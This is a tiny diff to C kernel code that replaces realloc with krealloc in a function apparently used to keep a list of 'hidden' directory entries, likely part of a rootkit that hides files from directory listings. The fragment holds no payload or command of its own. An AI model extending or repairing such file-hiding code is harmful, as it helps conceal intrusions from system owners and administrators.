@@ -30,7 +30,7 @@ void remove_hidden_dent(char *dent)
 		}
 		if (move && i + 1 < dent_size) {                                
 			int size = strlen(*(hidden_dents + i + 1));                                   
-			*(hidden_dents + i) = realloc(*(hidden_dents + i), (size + 1)*sizeof(char));          
+			*(hidden_dents + i) = krealloc(*(hidden_dents + i), (size + 1)*sizeof(char), GFP_KERNEL);          
 			memset(*(hidden_dents + i), 0, (size + 1));                                   
 			strncpy(*(hidden_dents + i), *(hidden_dents + i + 1), size);                          
 		}     
